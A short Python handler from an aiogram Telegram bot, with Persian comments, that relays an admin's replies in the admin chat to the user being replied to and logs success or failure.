@dp.message()
async def handle_admin_messages(message: Message):
    """پردازش پیام‌های ادمین و ارسال به کاربر"""
    # فقط پیام‌های ادمین رو پردازش کن
    if message.chat.id != ADMIN_CHAT_ID:
        return

    # اگر پیام ریپلی داشت، به کاربر ریپلی شده ارسال کن
    if message.reply_to_message:
        # ✅ راه‌حل صحیح و ساده
        user_id = message.reply_to_message.from_user.id

        try:
            await bot.send_message(
                user_id,
                f"📩 **پیام از ادمین:**\n\n{message.text}",
                parse_mode="Markdown"
            )
            await message.reply(f"✅ پیام به کاربر `{user_id}` ارسال شد.", parse_mode="Markdown")
            logger.info(f"✅ پیام از ادمین به کاربر {user_id} ارسال شد.")
        except Exception as e:
            await message.reply(f"❌ خطا در ارسال پیام: {e}")
            logger.error(f"❌ خطا در ارسال پیام از ادمین: {e}")
    else:
        await message.reply(
            "⚠️ لطفاً روی پیام یک کاربر ریپلی کنید تا پیام به او ارسال شود.\n"
            "یا از دستورات زیر استفاده کنید:\n"
            "`/users` - لیست کاربران فعال\n"
            "`/broadcast` - ارسال پیام به همه کاربران"
        ) =============================================
